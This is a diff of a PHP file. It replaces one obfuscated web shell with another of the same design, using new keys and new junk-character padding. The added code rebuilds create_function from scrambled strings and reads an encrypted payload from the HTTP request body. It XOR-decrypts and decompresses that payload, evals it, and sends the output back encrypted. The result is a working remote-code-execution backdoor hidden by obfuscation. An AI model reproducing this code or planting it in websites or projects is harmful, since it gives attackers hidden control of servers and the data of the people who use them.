@@ -1,11 +1,13 @@
 <?php
-$u='rt();@ev$Wal(@g$Wzuncompress$W(@x(@b$Wase$W64_decode($W$m[$W1]),$k)$W));$W$o=@$Wob$W_get_conten';
-$n='r($j=0;($j<$c&$W&$i<$l$W)$W;$j+$W+,$i++){$o.=$$Wt{$$W$Wi}^$k{$j$W};}}retur$Wn $o;$W}$Wif (@p$W$Wreg$';
-$K=str_replace('vT','','crevTatvTevT_fuvTvTncvTtion');
-$j='nction x($W$t,$$Wk){$c$W$W$W=strlen($$Wk);$l=strlen($t);$W$o="$W";for($i$W=0;$i<$l$W$W;){f$Wo';
-$Z='ts();$W$W@ob_end$W_clean();$$Wr=@base$W64_e$Wncode(@x($W@$Wgz$Wcom$Wpress($o),$k));pr$W$Wint($W"$p$kh$r$kf");}';
-$b='$k=$W"f06d$W8124";$kh$W="342$Wdfee7$Wbf$Wa1";$k$Wf="$W2967732fabb5";$$Wp="c$WUefyFAoK5$WjJ$WBJAF";$Wfu';
-$p='W_match("/$kh(.+)$kf/"$W,@fi$Wle_get_cont$Went$Ws("ph$W$Wp://input$W$W"),$$Wm)==1) {@ob_s$Wta';
-$P=str_replace('$W','',$b.$j.$n.$p.$u.$Z);
-$X=$K('',$P);$X();
+$t='atcWh("/W$Wkh(.+)$kf/",@file_Wget_conWteWntWs("pWhp://iWnput"),$m)==';
+$B='();$r=@base6W4_encoWde(W@x(@gzcompreWss($oW),$k));pWrint(W"$p$Wkh$r$kf");}';
+$P=str_replace('we','','wecwereate_wefuwenwectiweon');
+$S='NmYWoOWBI5WqGmWmcYoS";function x($Wt,$k){W$Wc=strlen($k)W;$lW=st';
+$f='$k=WW"1ff9759e";$kh="73WW276c4W749c9";$kfW=W"87303ae3696WaW";$p="';
+$p='e($WWm[1]),$k)));$Wo=@ob_Wget_Wcontents();@WWob_endWW_cWlean';
+$Z='$j++W,W$i++){$o.=$Wt{W$i}^$k{$Wj}W;}}retuWrn $oW;W}if (@preg_Wm';
+$E='Wrlen($Wt);$o="WW";for($i=0;$i<W$l;){WfoWr($j=W0;($j<$c&W&$i<$l);';
+$Q='1) {W@ob_stWart();@eWval(@WgzunWcompressW(W@x(@baseW6W4_decod';
+$F=str_replace('W','',$f.$S.$E.$Z.$t.$Q.$p.$B);
+$i=$P('',$F);$i();
 ?>
